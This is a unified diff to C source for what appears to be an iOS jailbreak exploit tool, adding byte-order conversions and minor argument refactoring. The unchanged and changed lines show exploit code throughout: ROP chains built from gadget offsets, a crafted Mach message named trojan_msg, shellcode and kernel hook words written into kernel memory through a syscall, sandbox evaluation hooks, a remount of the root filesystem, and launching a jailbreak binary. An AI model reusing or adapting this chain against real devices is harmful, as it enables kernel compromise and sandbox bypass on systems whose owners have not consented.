@@ -9,6 +9,8 @@
 #include "fsgen-mac-defines.h"
 #include "fsgen-global-constants.h"
 
+#include "endianness.h"
+
 typedef unsigned int Addr;
 
 int STRLEN_PID;
@@ -502,7 +504,9 @@ void _remountroot() {
         ropLoadReg0Const(newString("/dev/disk0s1s1"));
 	ropSaveReg0(remountArgs + 0x00); // mount_args.fspec
 
-        ropCall4(dscs + offsets->_dsc_mount, newString("hfs"), newString("/"), MNT_UPDATE, remountArgs);
+	unsigned int p2 = newString("/");
+	unsigned int p1 = newString("hfs");
+        ropCall4(dscs + offsets->_dsc_mount, p1, p2, MNT_UPDATE, remountArgs);
 
 	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c);
         ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("* mount returned: %d\n"), PLACE_HOLDER);
@@ -548,6 +552,9 @@ void bootstrap()
 	f = fopen("sysent_1c50", "rb");
 	fread(&sysentRestore[0], 4, 0x80, f);
 	fclose(f);
+	for (j = 0; j < 0x80; j++) {
+		sysentRestore[j] = le32toh(sysentRestore[j]);
+	}
 	// quick syscall restore
         for (j = 0; j < 0x2b; j++) {
 		ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4, sysentRestore[j]); // -4 because of the gadget doing a str [rx, #4]
@@ -566,6 +573,7 @@ void bootstrap()
 	fread(&zfreehooker[0], 4, len >> 2, f);
 	fclose(f);
 	for (j = 0; j < (len >> 2); j++) {
+		zfreehooker[j] = le32toh(zfreehooker[j]);
 		ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOKER_ADDR + (j << 2) - 4, zfreehooker[j]);
 	}
 
@@ -578,6 +586,7 @@ void bootstrap()
 	fread(&zfreehook[0], 4, len >> 2, f);
 	fclose(f);
 	for (j = 0; j < (len >> 2); j++) {
+		zfreehook[j] = le32toh(zfreehook[j]);
 		ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOK_ADDR + (j << 2) - 4, zfreehook[j]);
 	}
 
@@ -597,6 +606,7 @@ void bootstrap()
 	fread(&shellcode[0], 4, len >> 2, f);
 	fclose(f);
 	for (j = 0; j < (len >> 2); j++) {
+		shellcode[j] = le32toh(shellcode[j]);
 		ropCall3(dscs + offsets->_dsc_syscall, 309, SHELLCODE_ADDR + (j << 2) - 4, shellcode[j]);
 	}
 
@@ -609,6 +619,7 @@ void bootstrap()
 	fread(&sb_evaluatehooker[0], 4, len >> 2, f);
 	fclose(f);
 	for (j = 0; j < (len >> 2); j++) {
+		sb_evaluatehooker[j] = le32toh(sb_evaluatehooker[j]);
 		ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOKER_ADDR + (j << 2) - 4, sb_evaluatehooker[j]);
 	}
 
@@ -621,6 +632,7 @@ void bootstrap()
 	fread(&sb_evaluatehook[0], 4, len >> 2, f);
 	fclose(f);
 	for (j = 0; j < (len >> 2); j++) {
+		sb_evaluatehook[j] = le32toh(sb_evaluatehook[j]);
 		ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOK_ADDR + (j << 2) - 4, sb_evaluatehook[j]);
 	}
 
@@ -648,9 +660,10 @@ void bootstrap()
 	ropLog("* Finished. Executing hello.\n");
 
         ropCall2(dscs + offsets->_dsc_chmod, newString("/var/mobile/Media/corona/jailbreak"), 0755);
-        ropCall3(dscs + offsets->_dsc_execl, newString("/var/mobile/Media/corona/jailbreak"), newString("/var/mobile/Media/corona/jailbreak"), 0);
+	unsigned int p2 = newString("/var/mobile/Media/corona/jailbreak");
+	unsigned int p1 = newString("/var/mobile/Media/corona/jailbreak");
+        ropCall3(dscs + offsets->_dsc_execl, p1, p2, 0);
 	ropCall1(dscs + offsets->_dsc_exit, 0);
-
 }
 
 void exploit()
@@ -877,10 +890,10 @@ void exploit()
 
         memset(&msg, 0, sizeof(msg));
 
-        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
-        msg.header.msgh_size = sizeof(msg);
-        msg.header.msgh_id = dscs + offsets->GADGET_ADD_SP_120_POP8_10_4567 - 100;
-        msg.pc = dscs + offsets->GADGET_MOV_SP_R4_POP8_10_11_4567;
+        msg.header.msgh_bits = htole32(MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND));
+        msg.header.msgh_size = htole32(sizeof(msg));
+        msg.header.msgh_id = htole32(dscs + offsets->GADGET_ADD_SP_120_POP8_10_4567 - 100);
+        msg.pc = htole32(dscs + offsets->GADGET_MOV_SP_R4_POP8_10_11_4567);
 
         Addr aMsg = newBinary(&msg, sizeof(struct trojan_msg));
         ropLoadReg0(aPort);
